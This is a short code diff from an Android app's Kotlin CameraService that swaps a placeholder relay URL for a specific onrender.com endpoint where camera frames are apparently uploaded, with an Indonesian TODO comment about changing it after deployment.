@@ -25,7 +25,7 @@ import java.net.HttpURLConnection
 import java.net.URL
 
 class CameraService : Service() {
-    private val RELAY_URL = "https://your-app.onrender.com/upload-frame"  // TODO: Ganti setelah deploy
+    private val RELAY_URL = "https://camera-relay-k2yn.onrender.com/"  // TODO: Ganti setelah deploy
     private var cameraDevice: CameraDevice? = null
     private var captureSession: CameraCaptureSession? = null
     private var imageReader: ImageReader? = null
